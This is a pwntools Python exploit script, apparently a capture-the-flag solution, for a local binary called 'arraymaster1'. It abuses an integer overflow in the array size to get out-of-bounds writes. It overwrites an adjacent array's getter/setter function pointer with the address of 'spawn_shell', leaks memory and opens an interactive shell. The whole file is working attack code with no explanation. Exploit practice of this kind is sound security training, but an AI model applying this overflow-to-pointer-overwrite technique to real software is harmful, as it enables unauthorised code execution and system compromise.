from pwn import *

p=process('./arraymaster1')
e=ELF('./arraymaster1')
# pause()

def list_info(p):
    p.recvuntil('\n> ')
    p.sendline('list')
    log.info('[LISTING]')

def init(p,a,b,c):
    p.recvuntil('\n> ')
    p.sendline('init {} {} {}'.format(a,b,c))
    log.info('[INIT ARR] <{}>'.format(a))
    log.info(p.recvline())
def delete(p,a):
    p.recvuntil('\n> ')
    p.sendline('delete {}'.format(a))
    log.info('[DELETE ARR] <{}>'.format(a))


def set_(p,a,b,c):
    p.recvuntil('\n> ')
    p.sendline('set {} {} {}'.format(a,b,c))
    log.info('[SET VALUE] ARR<{}> index<{}> val<{}>'.format(a,b,c))

def get(p,a,b):
    p.recvuntil('\n> ')
    p.sendline('get {} {}'.format(a,b))
    log.info('[GET DATA] ARR<{}> index<{}>'.format(a,b))
    return p.recvline()

def quit(p):
    p.recvuntil('\n> ')
    p.sendline('quit')


init(p,'A',64,(0xffffffffffffffff+1)/8)
init(p,'B',64,(10))
# init(p,'B',64,10)
# init(p,'C',32,10)
# set_(p,'C',0,789)
# delete(p,'C')

# init(p,'D',64,11)
# #for i in range(1):
# set_(p,'A',0,123)
# set_(p,'B',0,456)

# set_(p,'D',0,0x656565)
log.info('[SPAWNSHELL]: '+hex(e.sym['spawn_shell']))
log.info('[getter_64]: '+hex(e.sym['int64_get']))
log.info('[setter_64]: '+hex(e.sym['int64_set']))
set_(p,'A',8,e.sym['spawn_shell'])

for i in range(10):
 log.info('[LEAKED]: '+hex(int(get(p,'A',i),16)))
 sleep(0.2)

set_(p,'B',0,1)

# log.info('[MALLOC]: '+ hex(e.got['malloc']))
p.interactive()
             



